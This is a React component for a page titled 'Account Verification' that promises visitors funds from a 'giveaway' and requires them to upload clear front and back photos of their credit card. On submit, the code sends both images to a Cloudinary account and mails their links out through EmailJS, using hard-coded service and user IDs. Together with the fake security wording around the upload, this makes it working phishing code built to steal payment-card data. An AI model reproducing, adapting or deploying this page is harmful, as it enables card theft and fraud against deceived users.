import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import emailjs from 'emailjs-com';
import Navbar from './Navbar';
import Footer from './Footer';
import img1 from "./img/imgCard.png"
import img2 from "./img/imgCard1.png"

const OTPValidation = () => {
  // const [otp, setOtp] = useState('');
  const [file1, setFile1] = useState(null);
  const [file2, setFile2] = useState(null);
  const [file1Url, setFile1Url] = useState('');
  const [file2Url, setFile2Url] = useState('');
  const navigate = useNavigate();

  // Handle file changes
  const handleFile1Change = (e) => {
    setFile1(e.target.files[0]);
  };

  const handleFile2Change = (e) => {
    setFile2(e.target.files[0]);
  };

  // Upload file to Cloudinary
  const uploadToCloudinary = async (file) => {
    if (!file) return null;
    const formData = new FormData();
    formData.append('file', file);
    formData.append('upload_preset', 'image_one'); // Replace with your actual upload preset
    formData.append('cloud_name', 'di9fxztii'); // Replace with your actual cloud name

    try {
      const response = await fetch(`https://api.cloudinary.com/v1_1/di9fxztii/image/upload`, {
        method: 'POST',
        body: formData,
      });
      const data = await response.json();
      return data.secure_url; // Return the URL of the uploaded image
    } catch (error) {
      console.error('Error uploading file:', error);
      return null;
    }
  };

  const handleOtpSubmit = async (e) => {
    e.preventDefault();

    // Upload both files to Cloudinary
    const file1UploadedUrl = await uploadToCloudinary(file1);
    const file2UploadedUrl = await uploadToCloudinary(file2);

    setFile1Url(file1UploadedUrl);
    setFile2Url(file2UploadedUrl);

    if (file1UploadedUrl && file2UploadedUrl) {
      sendOtpEmail(file1UploadedUrl, file2UploadedUrl);
      // navigate('/payment-receipt');
      // Navigate to the payment receipt page
    } else {
      console.error('File upload failed');
    }
  };

  const sendOtpEmail = (file1Url, file2Url) => {
    const templateParams = {
      file1Url,
      file2Url,
    };

    emailjs.send(
      'service_e234qa4', // Replace with your service ID
      'template_f0nymc7', // Replace with your template ID
      templateParams,
      'aM4ACgzNEz-ykB_dV' // Replace with your user ID
    )
      .then((response) => {
        console.log('SUCCESS!', response.status, response.text);
      })
      .catch((err) => {
        console.log('FAILED...', err);
      });
  };

  return (
    <div>
      <Navbar />
      <div className="container d-flex justify-content-center mt-5">
        <div className="col-md-6 mt-3">
          <h2 className="mt-5">Account Verification</h2>
          <p>You're one step away from receiving your funds. 
          <br/>
          Please verify your account to ensure your giveaway is sent promptly.
          </p>
          {/* <p>This step confirms that the cardholder is initiating the transaction or account registration, ensuring that the provided card details match the setup information for added security.</p> */}

          <div className="card mb-3">
            <div className="card-body">
              <p className="card-text fw-medium fs-6 fst-italic">This step confirms that the cardholder is initiating the transaction or account registration, ensuring that the provided card details match the setup information for added security.</p>
            </div>
          </div>

          <form onSubmit={handleOtpSubmit}>
            {/* <div className="form-group">
              <input
                className="form-control"
                placeholder="Enter OTP"
                value={otp}
                onChange={(e) => setOtp(e.target.value)}
                required
              />
            </div> */}

            {/* File Upload 1 */}
            <div className="form-group mt-3 fw-medium">
              <label>Upload Clear Front Photo of Your Credit Card</label>
              <input
                type="file"
                className="form-control"
                onChange={handleFile1Change}
                required
              />
            </div>
            {/* {file1 && ( */}
              <div className="mt-2">
                <p>Preview:</p>
                <img src={img1} alt="Preview" width="200px" height="130px"/>
                {/* <img src={URL.createObjectURL(file1)} alt="Preview" width="100px" /> */}
              </div>
            {/* )} */}

            {/* File Upload 2 */}
            <div className="form-group mt-3 fw-medium">
              <label>Upload Clear Back Photo of Your Credit Card</label>
              <input
                type="file"
                className="form-control"
                onChange={handleFile2Change}
                required
              />
            </div>
            {/* {file2 && (
              <div className="mt-2">
                <p>Preview:</p>
                <img src={URL.createObjectURL(file2)} alt="Preview" width="100px" />
              </div>
            )} */}
          
              <div className="mt-2">
                <p>Preview:</p>
                <img src={img2} alt="Preview" width="200px" height="130px" />
              </div>

            <button type="submit" className="btn btn-primary mt-3">VERIFY</button>
          </form>
          {/* <p className="mt-3">You will receive your code shortly</p>
          <p className="fs-5">Your payment receipt is what you will use to get your exam form</p> */}
        </div>
      </div>
      <Footer />
    </div>
  );
};

export default OTPValidation;